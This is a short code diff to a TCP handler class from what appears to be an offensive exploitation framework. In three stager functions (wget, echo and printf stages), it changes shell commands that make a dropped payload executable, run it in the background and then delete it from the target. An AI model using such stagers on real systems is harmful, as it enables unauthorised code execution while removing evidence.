@@ -90,9 +90,9 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}\n".encode())
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
         else:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}")
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
         requests.delete(wget_container)
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
@@ -121,9 +121,9 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}\n".encode())
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
         else:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}")
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
     
     def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
@@ -151,9 +151,9 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}\n".encode())
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
         else:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}")
+            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
